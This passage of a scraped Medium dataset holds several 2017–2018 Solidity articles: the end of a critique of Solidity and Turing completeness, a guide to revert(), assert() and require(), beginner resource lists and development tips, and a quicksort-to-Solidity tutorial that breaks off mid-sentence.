system that has billions of dollars behind it. Gavin stopped contributing over a year ago (source: https://github.com/ethereum/solidity/graphs/contributors).Hey, but maybe two developers is all you need, right? Clearly not. You still have unknown and unseen attacks occurring in the system every single day and you still can\u2019t define a float (aka a decimal number such as 0.1337) in Solidity. Yeah, let that sink it. The community says this is because of the floating-point problem, but another smart contracting language called Pact has already figured out a solution and they don\u2019t have billions of dollars worth of users behind them.Turing IncompletenessFor complicated applications that run on independent computers, Turing completeness works great. If the system crashes, you just have to reboot it. Because these systems are generally private, you can create permissioning and swath off huge potential attack points and limit how people use your app.In blockchain, everything is public. The original Turing complete systems don\u2019t really work well when you have everyone smashing everything all over the place. When a newbie programmer can trip over a wire and cause a $150,000,000 crash, you know something is wrong.That\u2019s why Turing incompleteness is the way in which we need to go. Not only is it safer, but the types of applications we\u2019ve seen on the Ethereum blockchain thus far do not require Turing completeness and it has only done more damage than good. Most contracts right now are for crowdfunding and moving assets. Why are we supporting a system that does so much more?Let\u2019s permission ourselves out of the system and only allow very specific operations to occur. It may not be a \u2018true computer\u2019 but that doesn\u2019t matter. We just want to be able to do certain things on the blockchain and in public.This new paradigm is being explored right now with the Pact smart contracting system which I urge you all to check out, and we will be using these lessons as we develop Seneca, Lamden\u2019s own smart contracting language.In terms of Turing incompleteness and Lamden, the Lamden Tau token from our token sale will be deployed on a delegated proof-of-stake blockchain system featuring this Turing incomplete smart contracting language.", "responses": 6, "tags": ["Ethereum", "Blockchain", "Hacking", "Solidity", "Parity"]}, {"title": "The use of revert(), assert(), and require() in Solidity, and the new REVERT opcode in the EVM", "post_link": "https://media.consensys.net/when-to-use-revert-assert-and-require-in-solidity-61fb2c0e5a57?source=search_post", "author_name": "Maurelian", "author_link": "https://media.consensys.net/@maurelian", "publish_date": "2017-09-19", "last_modified_date": "2018-06-21", "readtime": "5.37", "claps": 971, "voters": 167, "content": "The use of revert(), assert(), and require() in Solidity, and the new REVERT opcode in the EVMMaurelianFollowSep 19, 2017 \u00b7 6 min readPhoto by Osman RanaThe release of Solidity version 0.4.10 introduced the assert(), require() and revert() functions, and confusion has reigned ever since.In particular, the assert() and require() \u201cguard\u201d functions improve the readability of contract code, but differentiating between them can be quite confounding.In this article, I\u2019ll:explain the problem these functions solve.discuss how the Solidity compiler handles the new assert(), require() and revert().Give some rules of thumb for deciding how and when to use each one.For convenience, I\u2019ve created a simple contract using each of these features which you can test out in remix.If you really just want a TLDR, this answer on the ethereum stackexchange should do it.Patterns for error handling in SolidityThe old way: throw and the if \u2026 throw patternSay your contract has a few special functions, that should only be callable by a particular address which is designated as the owner.Prior to Solidity 0.4.10 (and for a while afterwards), this was a common pattern for enforcing permissions:contract HasAnOwner {    address owner;        function useSuperPowers(){         if (msg.sender != owner) { throw; }        // do something only the owner should be allowed to do    }}If the useSuperPowers() function is called by anyone other than owner, the function will throw returning an invalid opcode error, undoing all state changes, and using up all remaining gas (see this article for more on gas and fees in ethereum).The throw keyword is now being deprecated, and eventually will be removed altogether. Fortunately, the new functions assert(), require(), and revert() provide the same functionality, with a much cleaner syntax.Life after throwLet\u2019s look at how to update that if .. throw pattern with our new guard functions.This line:if(msg.sender != owner) { throw; }currently behaves exactly the same as all of the following:if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner);Note that in the assert() and require() examples, the conditional statement is an inversion of the if block\u2019s condition, switching the comparison operator != to ==.Differentiating between assert() and require()First, to help separate these \u2018guard\u2019 functions in your mind, imagine assert() as an overly assertive bully, who steals all your gas. Then imagine require() as a polite managerial type, who calls out your errors, but is more forgiving.With that mnemonic handy, what\u2019s the real difference between these two functions?Prior to the Byzantium network upgrade, require() and assert() actually behave identically, but their bytecode output is slightly different.assert() uses the 0xfe opcode to cause an error conditionrequire() uses the 0xfd opcode to cause an error conditionIf you look up either of those opcodes in the yellow paper, you won\u2019t find them. This is why you see the invalid opcode error, because there\u2019s no specification for how a client should handle them.That will change however after Byzantium, and the implemention of EIP-140: REVERT instruction in the Ethereum Virtual Machine . Then the0xfd opcode will be mapped to theREVERT instruction.This is what I find really fascinating:Many contracts have been deployed since version 0.4.10, which include a new opcode lying dormant, until it\u2019s no longer invalid. At the appointed time, it will wake up, and become REVERT!Note: throw andrevert() also use 0xfd. Prior to 0.4.10. throw used 0xfe.What the REVERT opcode will doREVERT will still undo all state changes, but it will be handled differently than an \u201cinvalid opcode\u201d in two ways:It will allow you to return a value.It will refund any remaining gas to the caller.1. It will allow you to return a valueMost smart contract developers are quite familiar with the notoriously unhelpful invalid opcode error. Fortunately, we\u2019ll soon be able to return an error message, or a number corresponding to an error type.That will look something like this:revert(\u2018Something bad happened\u2019);orrequire(condition, \u2018Something bad happened\u2019);Note: solidity doesn\u2019t support this return value argument yet, but you can watch this issue for that update.2. Refund the remaining gas to the callerCurrently, when your contract throws it uses up any remaining gas. This can result in a very generous donation to miners, and often ends up costing users a lot of money.Once REVERT is implemented in the EVM, it will be plain old bad manners not to use it to refund the excess gas.Choosing between revert(), assert() and require()So, ifrevert() and require() both refund any left over gas, AND allow you to return a value, why would want to burn up gas using assert()?The difference lies in the bytecode output, and for this I\u2019ll quote from the docs (emphasis mine):The require function should be used to ensure valid conditions, such as inputs, or contract state variables are met, or to validate return values from calls to external contracts. If used properly, analysis tools can evaluate your contract to identify the conditions and function calls which will reach a failing assert. Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.To clarify that somewhat: it should be considered a normal and healthy occurrence for a require() statement to fail (same with revert()). When an assert() statement fails, something very wrong and unexpected has happened, and you need to fix your code.By following this guidance, static analysis and formal verification tools will be able to examine your contracts to find and prove the conditions which could break your contract, or to prove that your contract operates as designed without flaws.In practice, I use a few heuristics to help me decide which is appropriate.Use require()to:Validate user inputs ie. require(input<20);Validate the response from an external contract ie. require(external.send(amount));Validate state conditions prior to execution, ie. require(block.number > SOME_BLOCK_NUMBER) or require(balance[msg.sender]>=amount)Generally, you should use require most oftenGenerally, it will be used towards the beginning of a functionThere are many examples of require() in use for such things in our Smart Contract Best Practices.Use revert()to:Handle the same type of situations as require(), but with more complex logic.If you have some complex nested if/else logic flow, you may find that it makes sense to use revert() instead of require(). Keep in mind though, complex logic is a code smell.Use assert() to:Check for overflow/underflow, ie. c = a+b; assert(c > b)Check invariants, ie. assert(this.balance >= totalSupply);Validate state after making changesPrevent conditions which should never, ever be possibleGenerally, you will probably use assert less oftenGenerally, it will be used towards the end of a function.Basically, require() should be your go to function for checking conditions, assert() is just there to prevent anything really bad from happening, but it shouldn\u2019t be possible for the condition to evaluate to false.Also: \u201cyou should not use assert blindly for overflow checking but only if you think that previous checks (either using ifor require) would make an overflow impossible\u201d. \u2014 comment from @chrisethConclusionThese functions are very powerful tools for your security toolbox. Knowing how and when to use them will not only help prevent vulnerabilities, but also make your code more user friendly, and future proof against upcoming changes.Do you love this stuff?I\u2019m part of the team at ConsenSys Diligence. If you have a knack for diving deeply into Solidity and the EVM, and an interest in smart contract security, we\u2019re looking for people to join our smart contract audit practice (apply here).If you made it this far in the post, but don\u2019t meet the exact criteria in the job description, that\u2019s OK. Just include a message mentioning this post, and calling out your experience with, and interest in Ethereum.Like this piece? Sign up here for our weekly newsletter.Disclaimer: The views expressed by the author above do not necessarily represent the views of Consensys AG. ConsenSys is a decentralized community with ConsenSys Media being a platform for members to freely express their diverse ideas and perspectives. To learn more about ConsenSys and Ethereum, please visit our website.", "responses": 10, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Security", "Blockchain"]}, {"title": "Here are the best courses and resources for learning Solidity (Ethereum dApps)", "post_link": "https://codeburst.io/here-are-the-best-courses-and-resources-for-learning-solidity-ethereum-dapps-600e18287381?source=search_post", "author_name": "Indrek Lasn", "author_link": "https://codeburst.io/@indreklasn", "publish_date": "2018-06-04", "last_modified_date": "2019-06-20", "readtime": "3.81", "claps": 1064, "voters": 168, "content": "Here are the best courses and resources for learning Solidity (Ethereum dApps)Indrek LasnFollowJun 4, 2018 \u00b7 4 min readSolidity learning resources are not that well-known. Here\u2019s a useful list for learning solidity and Ethereum development.First of all \u2014 what is solidity?\u201cSolidity is a contract-oriented, high-level language for implementing smart contracts. It was influenced by C++, Python and JavaScript. It is designed to target the Ethereum Virtual Machine (EVM).\u201dSecondly \u2014 what is Ethereum?In a nutshell, Ethereum is a blockchain-based distributed ledger which keeps track of all the states/transactions. A single entity (computer) is called a node. All nodes combined creates the Ethereum network. Think of Ethereum as this \u201csuper-computer\u201d and solidity a way to give instructions to the \u201csuper-computer\u201d.But why is this even a thing?Now, that\u2019s an excellent question. Ethereum is an interesting concept. Why?Ethereum allows us to build decentralized apps (dApps). Here are a couple dApp use cases top of my head:No one has the right to censor you nor delete your comments on the free web. Freedom of speech. It\u2019s especially important for modern media platforms. (Transparency)Cryptocurrencies/tokens. You have the full rights to your assets and no one has the privilege of freezing your accounts. Transferring cryptocurrencies only requires the raw computing power to compute the transaction.Check out this introduction if you need more info.So how do you get started building Dapps? Great question. I gathered a list to help you kickstart developing dApps with Solidity and Ethereum.Ethereum and Solidity: The Complete Developer\u2019s GuideYou will learn the following:How to design, test, and deploy secure Smart Contracts.Why engineers would want to create an app with Ethereum.How to use the latest version of Ethereum development tools (Web3 v1.0)Ethereum Smart ContractsThe following things you will learn from this course are:State, Functions, Modifiers and EventsPayable functionsInheritanceContract To Contract CommunicationLibrariesSmart Contracts and Decentralized Apps 101This course grants eye-opening experience in the following fields:Solidity and Ethereum basics (101).Interact with smart contracts from a UI. (Thanks to web3.js)cryptozombies.io\u201cCryptoZombies is an interactive code school that teaches you to write smart contracts in Solidity through building your own crypto-collectables game.\u201dDiscover Ethereum & SolidityFrom the maker of the course:Many people are excited about the promises of Ethereum and are itching to create a new generation of decentralized applications for the web.However, navigating the Ethereum landscape as a developer can be very confusing, since writing apps for the blockchain requires grasping many new concepts. On top of that, most tutorials are out-of-date or use deprecated tools in a rapidly changing ecosystem, making it hard to even know where to start.That\u2019s why I\u2019ve created this course, where beginners can create a complete DApp from start to finish, using common best practices from the Ethereum ecosystem.By the end of the tutorial, you will have all the skills required to design your own smart contracts in Solidity, hooking them up to a modern web interface, and create your very own token sale to help you successfully kickstart future blockchain projects.Learning SolidityWhat you will learn:From basics to state modifiers.Auditing your code and finding security flaws.Truffle, Testrpc, ERC20 tokens.Capture the Ether \u2014 (game)Ethereum Smart Contract Security Best Practices \u2014Awesome Solidity \u2014 (Github repository)One of my favorite curated lists consisting of solidity stuff.ethereumdev.ioDapp UniversityDo you know any excellent high-quality solidity courses? Post them below and I\u2019ll make sure to add them here!Thanks for making it to the bottom. If you find this useful \u2014 please give me some claps so more people can see it. You can find me on Twitter \u2014 @lasnindrekThe secret to being a top developer is building things! Here\u2019s a list of fun apps to build!You can only become a great developer by putting the effort in. Imagine for a moment \u2014 You can\u2019t become fit physically\u2026medium.freecodecamp.orgHow to set-up a powerful API with Nodejs, GraphQL, MongoDB, Hapi, and SwaggerSeparating your frontend and backend has many advantages:medium.freecodecamp.org\u2764", "responses": 7, "tags": ["Technology", "Smart Contracts", "Solidity", "Ethereum", "Blockchain"]}, {"title": "The Best Way to Start Coding in Solidity", "post_link": "https://medium.com/@davekaj/solidity-tips-and-tricks-for-beginners-building-their-first-dapp-on-ethereum-fed32d6a19ac?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2017-09-16", "last_modified_date": "2018-06-18", "readtime": "8.85", "claps": 1033, "voters": 157, "content": "The Best Way to Start Coding in SolidityDave KajpustFollowSep 16, 2017 \u00b7 9 min readThis post is a list of Solidity tips and tricks I learned the hard way, by going through Solidity on my own and brute forcing my way through learning. This is really the only way to do it right now if you are learning on your own. It will help to identify the easiest tools and tips in order to get your first dApp deployed on the testnet using Heroku.To start coding a new language, you want the easiest development environment that will help you through bugs so you can learn from your mistakes quickly as you go. Start by using the Remix Solidity IDE https://remix.ethereum.org.It is great for debugging, and gives you an option to step through the contract which is extremely helpful. I found it very useful to use the debugger throughout the whole development of my dApp, but at the start it was 100% necessary to help me write code that would actually compile.You should use remix until you get your dApp to compile with no bugs.There are three options with remix for injecting a blockchain instance into the browser, you can use the Javascript Virtual Machine (JVM), an injected web3 instance (like the chrome extension Metamask), or connecting to a web3 provider (like Infura). The JVM is the way to go when you are a beginner. It is much more forgiving, it ignores gas limits, it gives you an unlimited amount of ether to play with between 5 accounts, and it is much faster to debug with.Make sure the environment is JavaScript VM when starting with your first dApp.Start using Event Logs as much as possible to debug your code. They are the closest thing to console.log() from Javascript, as they can notify you of any changes to the state variables of your contract. In Remix they automatically show up in the user interface on the right side. When you want to see them from the front end of your dApp you will have to watch for the event with web3.js (explained later on in this post).Events are shown in the right side user interface of remix.Note that Remix is glitchy sometimes. If it isn\u2019t doing what you think it should be doing, open and close a new chrome window and it often helps. This is new software that is in active development, so bugs are expected.Note that sometimes the numbers in local or state storage while debugging will be extremely large. This might be due to accidental overflow for an integer calculation. However I have noticed that there is a bug in Remix . Sometimes while debugging it will show overflow, but in reality the contract still works and you get the correct results when executing functions in your dApp. So really pay attention when debugging to local and state storage, and if it is showing overflow and your contract still works perfectly, you are probably okay.Using the Solidity Locals and Solidity State variable viewer in the debugger of remix is extremely helpful to see if your functions are working properly.Keep in mind the first dApp you build will be slow when you are calling functions because you have to wait for blocks to be mined to get a response. This won\u2019t rear its ugly head while using the JVM, as everything happens instantaneously. As you move away from the JVM it will be more frustrating to debug, so do as much debugging as you can here.Moving onto a Better Development Environment with Truffle and testRPCIt is tempting to keep using Remix, but you should move on once you get to a point where your dApp compiles properly. Next you should use tools such as Truffle and testRPC that help simulate a real blockchain, so you can test your dApp in a more realistic situation.Truffle is a framework for developing and deploying Ethereum dApps. It is the best framework out there right now, and they are constantly upgrading and improving their product.testRPC is a simulated Ethereum blockchain you can run on your local machine that has been tweaked specifically for fast testing. You don\u2019t have to wait anytime between blocks to see how your dApp is responding, which is super helpful for testing and debugging. However it still gives you a real blockchain environment for testing that will fail for things like an out of gas limitation.Truffle lets you write tests for your dApp with Javascript (based on mocha\u2019s framework) and Solidity. Overall I have found that Javascript is better for integration tests, while Solidity is better for unit testing. However, I was unable to find good examples of Solidity testing online, and the documentation on it is not very in depth. Because of this I ended up doing the majority of my testing with Javascript because there is excellent documentation for mocha.It is sometimes tricky to test smart contracts, because there are situations where you want your contract to fail, like if only the owner is supposed to call a function, and if someone else tries to it should fail. The basic framework of truffle isn\u2019t fully adapted to easily test for this at the moment, but there is a good blog post on a workaround that helps with testing for failures.Sometimes testRPC can act weird in the terminal. If you don\u2019t end testRPC properly and you close your terminal window, it could still be running. Then the next time you try to run testRPC it won\u2019t allow you to start a new instance. This happened most frequently to me when I used MetaMask. For some reason you can\u2019t crtl+C out of testRPC when it is connect to MetaMask, so I started doing crtl+Z, and then I ran into these problems. I found resetting my computer cleans this up, and any other issues I came across with testRPC.Turning it into a Real Front End dApp with Truffle BoxesTruffle Boxes is a combination of the Truffle Framework and the React Framework. In order to use truffle boxes, you\u2019ll need a basic understanding of react to go forward.Build out the most basic version of your front end dApp to interact with your contract. It will end up being almost exactly like a normal React app, but you use web3 js (which comes included in Truffle) to interact with the blockchain. You will then have to inject a blockchain instance into your chrome browser so that you can interact with your testRPC on the testnet.MetaMask is the easiest way to interact with a blockchain in the browser. It is a chrome extension that allows you to inject the mainnet, the testnet, or a local instance (like testRPC) of a blockchain. It also allows you to use multiple accounts and send ether or testnet ether between them. Then the web3 code in your front end will interact with the blockchain injected from MetaMask, and you have connected your dApp to a real blockchain!Metamask Chrome Extension interface \u2014 unfortunately that is testnet ether, which is worthless :(.Note that in a developement environemnt with metamask, you should never store real ether alongside your testnet ether, just in case you make a mistake, and send real ether while testing.You can get test net ether for the rinkeby test net here: https://faucet.rinkeby.io/.Always send transactions with a high gas cost in GWEI on the testnet. You might be inclined to keep it low because you are used to doing so for mainnet transactions. I\u2019ve have long waiting times and bugs that have cost me an hour or two of time because I simply set way too small of a gas price on a large contract deployment, and then it failed on the test net, but MetaMask thought it succeeded. Then I couldn\u2019t do anything because MetaMasks nonce count was incorrect. Testnet ether is worthless so you might as well send a lot to beat everyone else in the line!Use the mnemonic flag in testRPC to repeatedly get the same accounts generated whenever you start a new testRPC instance. I use the following command in my terminal:The mnemonic flag generates ethereum accounts based on a string you pass it upon starting testRPC. If I always provide \u201chello\u201d, I will always get the same accounts. This makes it easier to hardcode in accounts while running tests. The accounts flag is used to generate 50 addresses, also good for testing.Accounts[0] (from truffle and web3) will be the account that MetaMask had opened up when the dApp is loaded in the browser. Sometimes MetaMask is finicky, and if you switch back and forth between accounts the dApp\u2019s web3 and Metamasks accounts won\u2019t be talking to each other correctly. Just refresh the page.MetaMask will sometimes let you know a call from your front end dApp to the blockchain is going to fail by maxing out the gas you are sending with the transaction, and sending 0 ether instead of the amount the dApp is asking for. It doesn\u2019t explicitly say why it will fail, but it will, and it will use up all the testnet gas. This happens most often when an account tries to call a function that it does not have access to, and it will just revert and burn the gas.Deployment with HerokuHeroku is perfect for deploying your dApp because it is super easy to do, and your dApp doesn\u2019t have a backend which makes Heroku\u2019s simple setup very attractive. This article will help with deploying a dApp on Heroku (you will have to let chrome translate the page to English) https://medium.com/taipei-ethereum-meetup/ethereum-dapp-tutorial-push-button-cae3810086a4.My first version of my first dApp deployed to Heroku was very basic, but it doesn\u2019t have to be pretty as long as the smart contract does what it is supposed to do! You can see it here: https://heroku-patreon.herokuapp.com/ (code is located here).The first version of the first dApp I deployed with heroku.When you deploy the front end to Heroku, you will have to deploy your contract to the testnet as well. Deploy the contract first, then once it is deployed you can get the address of the contract from etherscan, and hardcode it into your front end so that your dApp is interacting with the correct contract on the testnet. There are a few ways to deploy a contract to the testnet:You can deploy the contract using remix by injecting a web3 instance with MetaMask (make sure you change the environment from JavaScript VM to web3 instance, and that you pick the correct testnet to deploy to).You can deploy with myetherwallet here: https://www.myetherwallet.com/#contractsYou can deploy with truffle as well, and there are good instructions to do so in their documentation.I found using remix to be the easiest way to deploy a simple dApp.General TipsKeep your first few contracts simple.Always update your dev tools (Truffle, testRPC, MetaMask) as much as possible. This is a new field and new versions of the software come out weekly.Be weary of looking at old Solidity code and copying it directly into yours. Solidity is updated often and some of their functions have been deprecated.Read the Solidity documentation.Learn to deal with ether in wei from the beginning, because all numbers should be passed around in wei on the EVM and the front end. Otherwise you will have to retroactively go back and fix your code, which is frustrating.The first time you come across a Big Number while coding go read the documentation here. It will help immensely when you start passing numbers between your front end and the blockchain.Consistenly check back with the web3 documentation and the truffle documenation. They both have a lot of helpful functions that make building dApps easier. There were multiple times when I tried to do something on my own, only to realize that truffle or web3 already has a function that does what I needed.Things to look into for your second dAppOnce you get the hang of actually creating a dApp that works, start to look more into the security of writing good smart contract code. Learn about common pitfalls and bugs and how to prevent them. A great place to start is ConSensys\u2019s smart contract best practices.You can watch for Event Logs from the blockchain with the front end by using using web3 (https://github.com/ethereum/wiki/wiki/JavaScript-API#contract-events). Watching for Event Logs from the front end allows you to automatically update the front end when something is changed on the blockchain.Once you get the hang of smart contracts you can start to look at ways to reduce the gas cost of the deployment of your contract, and lowering gas cost for storage of state variables. When you are working on your first dApp there is no need to worry about this as it will just confuse you more.ConclusionGood luck deploying your first dApp! If you have any questions please ask in the comment section, or tweet at me @davekajpust.", "responses": 8, "tags": ["Ethereum", "Dapps", "Solidity", "Testrpc", "Metamask"]}, {"title": "Thinking in Solidity", "post_link": "https://blog.cotten.io/thinking-in-solidity-6670c06390a9?source=search_post", "author_name": "Tim Cotten", "author_link": "https://blog.cotten.io/@cottenio", "publish_date": "2018-06-04", "last_modified_date": "2018-06-20", "readtime": "19.0", "claps": 1012, "voters": 160, "content": "Thinking in SolidityConverting a Java Implementation of Quicksort to SolidityTim CottenFollowJun 4, 2018 \u00b7 20 min readThis article will help you convert a simple Java program to Solidity to solve a simple integer sorting problem, highlighting many of the perils and pitfalls to avoid in optimizing gas usage \u2014 especially pre-mature optimization and algorithm validation.On May 23rd, 2018 Ethereum\u2019s Nick Johnson posted the first-ever Solidity Gas Golfing Contest on reddit.Code golf contests are great because they encourage mastery of the intricacies of systems and programming languages in order to create the shortest possible source code to complete a given task. In the case of Ethereum and Solidity, this contest is all about minimizing the gas spent performing operations on the Ethereum Virtual Machine (EVM), rather than the brevity of the code itself.Why is that important? At the time of writing each Ethereum block has an upper gas limit of 8 million. The minimum transaction requires 21,000 gas, so there\u2019s a ceiling of about ~380 contract calls per block, and each block is processed every 15 seconds on average. Since every contract operation costs gas (adding numbers, iterating over arrays, creating new contracts, transferring balances, etc) minimizing the gas used is critical to writing executable code on the Ethereum blockchain.Bad or inefficient code can kill your contract viability or bring the Ethereum network to its knees, for instance: The Inside Story of the CrytoKitties Congestion Crisis.As someone who\u2019s been programming in Solidity for a while now, I found the contest a refreshing way to rethink what I know and challenge a lot of assumptions. The first thing I focused on was the Sorting Integers problem, which will be the focus of this article.Setting UpEach challenge in the contest is contained in either a truffle project or an embark project. As a truffle user I\u2019ll be using the code provided here: https://github.com/Arachnid/sggc.If you\u2019re new to Solidity coding, there\u2019s an excellent guide to getting started with your first truffle project here: The Complete Tutorial On Getting Started With Smart Contracts On Ethereum.Once you complete the tutorial above you\u2019re ready to jump directly into working on these challenges.Challenge #1: Sorting IntegersEach challenge in the golf contest is split into two components: Standard and Wild.The Standard challenge is just pure Solidity without any in-line bytecode. A Standard submission is automatically added to the Wild list as well, and contracts that execute the least amount of gas are the winners. Wild, as mentioned above, include EVM bytecode in areas that might be better tuned by hand and deep-knowledge rather than relying on the Solidity compiler.The first challenge is to take a list of n unsigned integers and sort them in ascending order. That\u2019s it! They might be in reverse order, random-order, or the list of integers may be empty: just return a sorted (or empty) array.The Contract: Sort.solThe initial contract provided contains an empty method called sort that has a single parameter input which is an array of unsigned integers, and the function is intended to return an array of unsigned integers.If you compile and run this right now in truffle (truffle compile; truffle test test/Sort.js) it\u2019ll issue the following error:/contracts/Sort.sol:21:19: Warning: Unused function parameter. Remove or comment out the variable name to silence this warning.function sort(uint[] input) public pure returns(uint[]) {^----------^In other words, it\u2019s expecting a returned uint[].The simplest first step is to simply return the incoming uint[] called input since that\u2019s the array we\u2019ll be operating on.Running the test suite now will show us a list of each of the (four) tests and how their results differ from the expected results.Now we have a good starting point to implement a sorting algorithm on the input variable.QuicksortThis article doesn\u2019t focus on \u201cthe best\u201d solution for the Integer Sorting problem; our goal is to just establish a known-good algorithm in an established language (Java), and highlight the techniques used to convert it into Solidity.For our purposes then let\u2019s implement Quicksort, an algorithm that mixes together efficiency with comprehensibility in a great ratio. In other words, it\u2019s easy to understand, easy to code, and is reasonably fast for average cases.For our purposes we\u2019re going to adapt the example implementation here: https://www.geeksforgeeks.org/quick-sort/This implementation uses two methods: a recursive sort() function and a partition() function. Quicksort chooses a \u201cpivot point\u201d and comparison sorts smaller and smaller partitions until the entire array is sorted.The beauty of this example is that it operates in-place on the existing array, so we don\u2019t need to create any new data-structures.Method StubsLet\u2019s begin by creating empty method stubs emulating the intention of the Java version.Java: void sort(int arr[], int low, int high) { ... }Solidity: function quickSort(uint[] arr, int low, int high) internal pure {}Java: int partition(int arr[], int low, int high) { ... }Solidity: function partition(uint[] arr, int low, int high) internal pure returns(int) {  return 0; // stub value}The intention of the Java sort() method is to operate in-place on the input array, and recursively calls itself on partitions of the array. It doesn\u2019t have any output: in Java this is denoted with the void keyword, but in Solidity you simply omit a list of return values.Two new keywords are introduced in the method signature: internal and pure. For the purposes of our algorithm we don\u2019t want this private/internal method to be called from anything but the originating contract\u2019s public method (also called sort()).Solidity supports polymorphism and all methods are virtual, so our new sort(uint[], int, int) method with the low and high integers will be called by the first sort(uint[]) method.The pure keyword denotes that this method (and by extension, other invoked methods) will NOT change the contract state in any way. No member fields are altered. No dynamic arrays in \u201cstorage\u201d are accessed. This is meant for methods executing math and math alone, only operating on the input and not the contract stored values.The intention of the partition() function is to find an optimal pivot point for the recursive sorting method to operate on the two new partitions. It returns an integer, and the only new addition is that the return type is specified in the tail-end of the method signature, not up-front like Java.Additionally, the return attribute is a list of values, and thus a function can assign multiple output values to multiple variables like so:(var1, var2, var3) = multiValueOutput();Since the function needs to return a value we put a stub return 0; as a temporary place-holder. This will be replaced shortly.Finally, to set us up to start testing our implementation, let\u2019s invoke the new sort function even if it doesn\u2019t do anything.The invocation of sort(uint[], int, int) in this case is expecting the boundaries for the partition we\u2019re sorting. To begin with, it\u2019s the entire array, so the low is 0 and the high is the number of elements minus one (the index of the last item in the array).Our implementation should look something like this:Why are we using bounds that are of type int if we\u2019re operating on an unsigned integer (uint) array? Does Solidity auto-cast int to uint for us if we\u2019re using array indexes?No. In fact, in the rest of the algorithm we\u2019ll have to explicitly cast int to uint when accessing elements in the array.Why not use uint then, besides the fact that the Java algorithm uses signed integers? Because of this: sort(arr, low, pi-1);Important Note: Prevent Underflow and OverflowAny operation that does subtraction in Solidity on a uint has the possibility of underflowing. If the value is 0 and you subtract 1, what is the value now? It\u2019s not negative one. It\u2019s 2\u00b2\u2075\u2076-1. Is that number greater than 0? Yes. Therefore, if you have a loop counting on the number being greater than or equal to 0 it will ALWAYS be true.That\u2019s a great way to write a contract that consumes all its gas while it\u2019s desperately trying to decrement a value in an infinite loop.Let\u2019s keep this in the front of our thoughts as we adapt the Java example.sort(uint[] arr, int low, int high)The Java example for this method is very short:void sort(int arr[], int low, int high) {  if (low < high) {    int pi = partition(arr, low, high);    sort(arr, low, pi-1);    sort(arr, pi+1, high);  }}Looking this over, nothing really stands out as Solidity specific besides the already implemented method signature. The difference here being that it\u2019s an unsigned integer array uint[] instead of integer.Solidity handles complex data-structures in a similar way to Java. There aren\u2019t any pointers, so an array of integers is passed by reference. The array arr[] is not a copy of input[] \u2014 it is input[]; thus, any changes to arr[] in sort(uint[], int, int) are going to be passed out as the result of sort(uint[]).If we copy-paste the internals exactly and run our tests it will compile (with some warnings) and the test suite will generate stack overflows.Ethereum has a stack size limit of 1,024. And since our partition method is empty and our current sort methods keep recursively calling themselves without any exit conditions.We\u2019d better implement that partition function!partition(uint[] arr, int low, int high)The partition function has a few jobs:Set an initial pivot point (this one chooses the highest value rather than the middle)Find the proper place for the pivot in the sorted array, and swap it for the value already thereReturn a new pivot pointNote: Quicksort algorithms vary in their implementation of pivots. As noted above this one chooses the highest element; the efficiency of this is dependent on the dataset being sorted.The Java implementation is as follows:int partition(int arr[], int low, int high) {  int pivot = arr[high];  int i = (low-1); // index of smaller element    for (int j=low; j<high; j++) {     // If current element is smaller than or    // equal to pivot    if (arr[j] <= pivot) {      i++;            // swap arr[i] and arr[j]      int temp = arr[i];      arr[i] = arr[j];      arr[j] = temp;    }  }    // swap arr[i+1] and arr[high] (or pivot)  int temp = arr[i+1];  arr[i+1] = arr[high];  arr[high] = temp;  return i+1;}Immediately we should remember the fact that we\u2019re using integers for the bounds instead of unsigned integers (required to access an array index in Solidity).We\u2019re going to have to cast those values at the time of array access (rather than convert them to uint at the start of the function) so we can keep doing integer math (with possible negative values) in the loop.Casting in Solidity is simple for these types uint(i) will do fine.The updated code will look like this:function partition(uint[] arr, int low, int high) internal pure returns(int) {  int pivot = int(arr[uint(high)]);  int i = (low-1); // index of smaller element  for (int j = low; j < high; j++) {    if (int(arr[uint(j)]) <= pivot) {      i++;      uint temp = arr[uint(i)];      arr[uint(i)] = arr[uint(j)];      arr[uint(j)] = temp;    }  }  uint temp2 = arr[uint(i+1)];  arr[uint(i+1)] = arr[uint(high)];  arr[uint(high)] = temp2;    return i+1;}We had to make several changes here:The pivot is an int so we had to access its position with a uint, then convert the uint to an intAll the array accesses have to be uintThe temporary variables used for swapping are uint because the array is uintDoes it compile? Yes! Let\u2019s run our test suite:It worked!As you can see the algorithm is correct and works fine, but is incredibly slow. It burned more than 7 million gas \u2014 about ~91% of one block\u2019s entire ability to run calculations. I even had to update the data/Sort.json to increase the simulated gas caps just to get it to finish the tests.SwappingEverything costs gas in Ethereum, even creating temp variables. Did you notice that I created a temp2 variable? Variables in a method have method-wide scope so I can\u2019t redeclare temp after the for loop.temp2 only exists for illustrative purposes, based on temp still persisting outside of the for loop I could\u2019ve just recycled it.But Solidity doesn\u2019t require you to use this nastiness. In the same way that method returns can be a list of values, we can assign multiple r-values to multiple l-values:// Java-ishuint temp = arr[uint(i)];arr[uint(i)] = arr[uint(j)];arr[uint(j)] = temp;// Solidity-ish(arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);Note the beautiful in-place swapping above. Is it just syntactic sugar or does it actually save us some gas?We\u2019ll do the same with the second part and re-run our test:(arr[uint(i+1)], arr[uint(high)]) = (arr[uint(high)], arr[uint(i+1)]);We saved 116,454 gas!That\u2019s still far too much gas to sort a couple hundred integers, but it demonstrates that Solidity language constructs do make a difference in the compiled bytecode and gas consumption. This is certainly a comment on the Solidity compiler itself lacking optimization cases for common swap techniques.Being Clever with XOR SwapAs a further demonstration, since we\u2019re using unsigned integers, let\u2019s try this without the Solidity language construct or the temporary variable. Let\u2019s dust off the old XOR swap algorithm.// Solidity (clean)(arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);AND (arr[uint(i+1)], arr[uint(high)]) = (arr[uint(high)], arr[uint(i+1)]);BECOME// Solidity (XOR swap)arr[uint(i)] ^= arr[uint(j)];arr[uint(j)] ^= arr[uint(i)];arr[uint(i)] ^= arr[uint(j)];arr[uint(i+1)] ^= arr[uint(high)];arr[uint(high)] ^= arr[uint(i+1)];arr[uint(i+1)] ^= arr[uint(high)];There\u2019s a great proof of why this works in the Wikipedia article. With the utmost faith in mathematics let\u2019s run our new code that replaces the multi-value swap with XOR swaps.Well, that\u2019s not what we were expecting. Something is causing the method to spend all the gas (an infinite loop? hint: it\u2019s almost always an infinite 